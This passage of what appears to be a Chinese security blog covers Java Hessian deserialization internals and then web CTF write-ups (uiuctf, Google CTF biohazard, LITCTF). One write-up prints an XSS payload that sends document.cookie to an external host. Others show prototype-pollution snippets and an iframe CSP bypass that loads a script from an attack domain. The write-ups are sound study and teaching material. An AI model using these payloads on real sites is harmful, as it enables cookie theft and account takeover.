class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getId call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setId call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Student"><a href="#Student" class="headerlink" title="Student"></a>Student</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">111</span>, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;ggg&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String gender;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Class&lt;Object&gt;&gt; innerMap;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; friends;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getInnerMap</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getInnerMap call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInnerMap</span><span class="params">(Map innerMap)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setInnerMap call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.innerMap = innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getGender call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setGender call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student default constructor call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, String name, String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student custom constructor call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ObjectInputStream)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readObject call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readResolve call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student hashCode call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student finalize call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, innerMap=&quot;</span> + innerMap +</span><br><span class="line">                <span class="string">&quot;, friends=&quot;</span> + friends +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Serialize-and-DeSerialize"><a href="#Serialize-and-DeSerialize" class="headerlink" title="Serialize and DeSerialize"></a>Serialize and DeSerialize</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLData;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HJSerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(os);</span><br><span class="line">            output.writeObject(t);</span><br><span class="line">            data = os.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(is);</span><br><span class="line">            result = input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (T) result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">111</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hessian&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Class&lt;Object&gt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>, ObjectInputStream.class);</span><br><span class="line">        innerMap.put(<span class="string">&quot;2&quot;</span>, SQLData.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">friend</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">222</span>, <span class="string">&quot;hessian1&quot;</span>, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">friends</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Student&gt;();</span><br><span class="line">        friends.add(friend);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        stu.setId(id);</span><br><span class="line">        stu.setName(name);</span><br><span class="line">        stu.setGender(gender);</span><br><span class="line">        stu.setInnerMap(innerMap);</span><br><span class="line">        stu.setFriends(friends);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian serialize----------------&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] obj = serialize(stu);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(obj));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian deserialize--------------&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> deserialize(obj);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>1.首先通过需要序列化的类，获取到相应的serializer，在通过这个serializer进行writeobject操作<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p><p>2.一般对于自己写的class，他就会获取到defaultserializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>3.在获取serializer的过程中，他会去读取Object中的fields，并对应上serializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p><p>4.获取完serializer，他会有一个将序列化的obj作为key，serializer作为value，加入到一个map和一个cachemap中<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>5.接着就是常规的获取field，然后在根据field的serializer写入数据了<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt><br>大概过程就是</p><ul><li>获取序列化对象相对应的serializer，并获得到fields，每个fields会依次对应上一个serializer</li><li>将serializer加入map和cachemap中</li><li>根据fields写入序列化数据</li></ul><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>首先看到他读取了序列化数据中的第一个字节，并判断是属于那种类型的，并在下面的switch语句中选择使用哪种Serializer去进行序列化，在这里是Map，注意这里的Map并不是说反序列化的类是Map类型的，而是所有Object类型都会被这个readMap处理用来反序列化<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt><br>接下来就是常规的根据field然后deserialize<br>在这里的具体操作就是根据变量名获取到相应的deserialize<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt><br>再在deserialize中获取value，并设置field</p><p><strong>上面的操作最好还是要自己跟一遍</strong></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>与kryo类似，hessian也是因为反序列化Map类型时会调用put方法<br>那利用点也是从hashCode与equals入手了<br>在这里就不重复造轮子了，可以参考这篇文章</p><ul><li><a href="https://paper.seebug.org/1131/">https://paper.seebug.org/1131/</a></li><li>参考marshalsec</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入门Hessian反序列化&quot;&gt;&lt;a href=&quot;#入门Hessian反序列化&quot; class=&quot;headerlink&quot; title=&quot;入门Hessian反序列化&quot;&gt;&lt;/a&gt;入门Hessian反序列化&lt;/h2&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="hessian" scheme="http://example.com/tags/hessian/"/>
    
  </entry>
  
  <entry>
    <title>前端ctf(持续更新)</title>
    <link href="http://example.com/2023/09/06/%E5%89%8D%E7%AB%AFctf/"/>
    <id>http://example.com/2023/09/06/%E5%89%8D%E7%AB%AFctf/</id>
    <published>2023-09-06T00:27:30.000Z</published>
    <updated>2023-09-23T15:32:41.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp<br><span id="more"></span></p><h2 id="uiuctf-peanut-xss"><a href="#uiuctf-peanut-xss" class="headerlink" title="uiuctf peanut-xss"></a>uiuctf peanut-xss</h2><p>nutshell.js中有一段代码<br><code>linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>其中innerText会html解码，而innerHTML会把赋值的内容原封不动的输出到页面中，所以如果输入的是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/span&amp;gt;&amp;lt;img src onerror=&amp;#39;fetch(&amp;quot;https:/</span><span class="regexp">/vps/</span>?cookie=&amp;quot;+<span class="variable language_">document</span>.<span class="property">cookie</span>)&amp;#<span class="number">39</span>;/&amp;gt;&amp;lt;span&amp;gt;</span><br></pre></td></tr></table></figure><br>解码完以后就是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;img src onerror=&#x27;fetch(&quot;https:/</span><span class="regexp">/vps/</span>?cookie=<span class="string">&quot;+document.cookie)&#x27;/&gt;&lt;span&gt;</span></span><br></pre></td></tr></table></figure><br>再把解码的内容赋值给innerHTML，那么就会造成dom xss<br>修复这个漏洞的话可以把innerHTML改成innerText<br><code>linkText.innerText = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>当innerText是被赋值的时候，输出到页面的时候会把html编码在输出</p><h2 id="google-ctf-biohazard"><a href="#google-ctf-biohazard" class="headerlink" title="google ctf biohazard"></a>google ctf biohazard</h2><p><a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard">https://github.com/google/google-ctf/tree/master/2023/web-biohazard</a><br>这是官方writeup，只对其中一些点进行记录</p><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当时看到Object.assign联想到了原型链污染，但是我是用类似下面的方式去尝试原型链污染的，显然是失败了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><br>但是如果是下面这种就是可以成功污染的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>((&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h3 id="污染的点-editor"><a href="#污染的点-editor" class="headerlink" title="污染的点 editor"></a>污染的点 editor</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#editor-style&#x27;</span>).<span class="property">content</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当uri开头不是view的时候就会加载这个loadEditorResources函数<br>而这个函数中<br><code>safeScriptEl.setSrc(script, trustedResourceUrl(editor));</code><br>这一段会设置一个js加载进去，<em>并且会设置好nonce</em>，其中editor在bootstrap.js中被定义了，所以只需要原型链覆盖了这个editor就可以了</p><h3 id="绕过csp"><a href="#绕过csp" class="headerlink" title="绕过csp"></a>绕过csp</h3><p>因为有csp策略，无法进行直接加载js，原型链污染不能直接覆盖被赋值的变量，所以利用iframe，设置csp，允许恶意的js加载，并且禁止加载bootstrap，就可以成功绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/views/view/5f1a24e1-2744-42e2-8127-19fccd9c3f98&quot;</span> csp=<span class="string">&quot;script-src https://attack.shhnjk.com/alert.js https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>在这里我想到如果没有nonce，他只是script-src <a href="http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行">http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行</a></p></blockquote><h2 id="LITCTF-2023-fetch"><a href="#LITCTF-2023-fetch" class="headerlink" title="LITCTF 2023 fetch"></a>LITCTF 2023 fetch</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">runHTMLFile</span> = <span class="keyword">async</span> (<span class="params">filePath</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>();</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">`file:<span class="subst">$&#123;filePath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://flag:6969/&quot;</span> + randomString, <span class="literal">false</span>);</span><br><span class="line">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> screenshot = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span 